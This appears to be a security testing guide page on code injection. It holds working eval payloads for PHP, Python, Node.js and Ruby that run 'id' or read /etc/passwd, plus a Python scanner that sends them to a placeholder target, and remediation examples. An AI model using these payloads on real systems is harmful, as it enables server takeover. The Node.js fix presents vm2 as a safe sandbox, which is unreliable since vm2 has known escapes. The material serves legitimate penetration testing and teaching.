# WSTG-INPV-11: Testing for Code Injection

## Test ID
WSTG-INPV-11

## Test Name
Testing for Code Injection

## High-Level Description

Code Injection occurs when an application incorporates user input into code that is dynamically executed. This includes injection into interpreted languages (PHP, Python, JavaScript, Ruby) through functions like eval(), exec(), or similar. Successful exploitation leads to arbitrary code execution on the server.

---

## What to Check

- [ ] eval() with user input
- [ ] exec() with user input
- [ ] Dynamic code execution
- [ ] Template evaluation
- [ ] Serialization vulnerabilities
- [ ] Dynamic function calls

---

## How to Test

### Step 1: Identify Code Injection Points

```bash
#!/bin/bash
TARGET="https://target.com"

# Test common code injection payloads
echo "[*] Testing for code injection..."

# PHP code injection
curl -s "$TARGET/page.php?code=phpinfo()"
curl -s "$TARGET/page.php?calc=1+1"
curl -s "$TARGET/page.php?eval=system('id')"

# Python code injection
curl -s "$TARGET/api/calc?expr=__import__('os').popen('id').read()"

# JavaScript/Node.js injection
curl -s "$TARGET/api/eval?code=require('child_process').execSync('id')"
```

### Step 2: Code Injection Tester

```python
#!/usr/bin/env python3
"""
Code Injection Vulnerability Tester
"""

import requests
import time

class CodeInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Code injection payloads by language
    PAYLOADS = {
        'php': [
            # Basic PHP functions
            "phpinfo()",
            "system('id')",
            "passthru('id')",
            "shell_exec('id')",
            "`id`",

            # Time-based
            "sleep(5)",

            # Assert injection
            "assert('system(\"id\")')",

            # Preg_replace /e modifier (deprecated)
            "preg_replace('/test/e','system(\"id\")','test')",

            # Create function
            "create_function('','system(\"id\");')",
        ],
        'python': [
            # eval injection
            "__import__('os').system('id')",
            "eval('__import__(\"os\").system(\"id\")')",
            "__import__('os').popen('id').read()",

            # exec injection
            "exec('import os; os.system(\"id\")')",

            # Time-based
            "__import__('time').sleep(5)",

            # Compile and exec
            "compile('import os\\nos.system(\"id\")','<string>','exec')",
        ],
        'nodejs': [
            # require injection
            "require('child_process').execSync('id')",
            "require('child_process').spawnSync('id')",

            # eval injection
            "eval(require('child_process').execSync('id').toString())",

            # Function constructor
            "new Function('return process.mainModule.require(\"child_process\").execSync(\"id\")')",

            # Time-based
            "require('child_process').execSync('sleep 5')",
        ],
        'ruby': [
            # eval injection
            "eval('`id`')",
            "system('id')",
            "exec('id')",
            "`id`",

            # Kernel methods
            "Kernel.system('id')",
            "%x(id)",

            # Time-based
            "sleep(5)",
        ],
    }

    def test_php_injection(self, param='code'):
        """Test PHP code injection"""
        print("\n[*] Testing PHP code injection...")

        for payload in self.PAYLOADS['php']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=15
                )

                # Check for successful execution
                if 'uid=' in response.text or \
                   'PHP Version' in response.text or \
                   'phpinfo()' in response.text:
                    print(f"[VULN] PHP Code Injection!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'PHP Code Injection',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                if 'sleep' in payload:
                    print(f"[VULN] Time-based PHP Code Injection!")
                    self.findings.append({
                        'type': 'PHP Code Injection (Time-based)',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True
            except Exception as e:
                pass

        return False

    def test_python_injection(self, param='expr'):
        """Test Python code injection"""
        print("\n[*] Testing Python code injection...")

        for payload in self.PAYLOADS['python']:
            try:
                start = time.time()
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=15
                )
                elapsed = time.time() - start

                # Check for successful execution
                if 'uid=' in response.text:
                    print(f"[VULN] Python Code Injection!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'Python Code Injection',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

                # Time-based check
                if elapsed > 4 and 'sleep' in payload:
                    print(f"[VULN] Time-based Python Code Injection!")
                    self.findings.append({
                        'type': 'Python Code Injection (Time-based)',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_nodejs_injection(self, param='code'):
        """Test Node.js code injection"""
        print("\n[*] Testing Node.js code injection...")

        for payload in self.PAYLOADS['nodejs']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=15
                )

                if 'uid=' in response.text:
                    print(f"[VULN] Node.js Code Injection!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'Node.js Code Injection',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                if 'sleep' in payload:
                    print(f"[VULN] Time-based Node.js Code Injection!")
                    self.findings.append({
                        'type': 'Node.js Code Injection (Time-based)',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True
            except Exception as e:
                pass

        return False

    def test_arithmetic_injection(self, param='calc'):
        """Test arithmetic expression injection"""
        print("\n[*] Testing arithmetic injection...")

        # If application evaluates math expressions
        test_cases = [
            ("7*7", "49"),
            ("1+1", "2"),
            ("100-1", "99"),
        ]

        for payload, expected in test_cases:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                if expected in response.text:
                    print(f"[INFO] Arithmetic evaluation detected")
                    # Try code injection
                    code_payloads = [
                        "__import__('os').system('id')",
                        "require('child_process').execSync('id')",
                    ]
                    for code_payload in code_payloads:
                        resp = self.session.get(
                            self.url,
                            params={param: code_payload}
                        )
                        if 'uid=' in resp.text:
                            print(f"[VULN] Code injection via arithmetic!")
                            self.findings.append({
                                'type': 'Code Injection via Arithmetic Eval',
                                'payload': code_payload,
                                'severity': 'Critical'
                            })
                            return True

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("CODE INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo code injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                print(f"  Payload: {f['payload'][:60]}")

    def run_tests(self, param='code'):
        """Run all code injection tests"""
        self.test_php_injection(param)
        self.test_python_injection(param)
        self.test_nodejs_injection(param)
        self.test_arithmetic_injection(param)
        self.generate_report()

# Usage
tester = CodeInjectionTester("https://target.com/eval")
tester.run_tests()
```

### Step 3: Language-Specific Payloads

```php
// PHP Code Injection Payloads
${system('id')}
${`id`}
";system('id');//
';system('id');//
phpinfo()
highlight_file('/etc/passwd')
file_get_contents('/etc/passwd')
```

```python
# Python Code Injection Payloads
__import__('os').system('id')
eval(compile('import os; os.system("id")','<string>','exec'))
(lambda: __import__('os').system('id'))()
getattr(__import__('os'),'system')('id')
```

```javascript
// Node.js Code Injection Payloads
require('child_process').execSync('id').toString()
global.process.mainModule.require('child_process').execSync('id').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Payload injection |
| Commix | Command/code injection |
| Custom scripts | Targeted testing |

---

## Remediation

```python
# Python - Never use eval with user input
# VULNERABLE
result = eval(user_input)

# SECURE - Use safe evaluation libraries
import ast
def safe_eval(expression):
    # Only allow basic math
    allowed_nodes = {
        ast.Expression, ast.Num, ast.BinOp,
        ast.Add, ast.Sub, ast.Mult, ast.Div
    }
    tree = ast.parse(expression, mode='eval')
    for node in ast.walk(tree):
        if type(node) not in allowed_nodes:
            raise ValueError("Unsafe expression")
    return eval(compile(tree, '<string>', 'eval'))
```

```php
<?php
// PHP - Avoid eval and dangerous functions
// VULNERABLE
eval($_GET['code']);

// SECURE - Use allowlists and safe alternatives
$allowed_functions = ['strlen', 'strtoupper', 'strtolower'];
$func = $_GET['func'];
if (in_array($func, $allowed_functions)) {
    $result = call_user_func($func, $input);
}
?>
```

```javascript
// Node.js - Avoid eval and vm with user input
// VULNERABLE
eval(userInput);

// SECURE - Use sandboxed evaluation
const { VM } = require('vm2');
const vm = new VM({
    timeout: 1000,
    sandbox: {}
});
const result = vm.run(userInput);
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Direct code execution | 9.8 | Critical |
| eval() with user input | 9.8 | Critical |
| Arithmetic injection to RCE | 9.8 | Critical |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-94** | Improper Control of Generation of Code |

---

## Checklist

```
[ ] eval() functions identified
[ ] Dynamic code execution tested
[ ] Time-based payloads tested
[ ] Multiple languages tested
[ ] Arithmetic injection tested
[ ] Findings documented
```
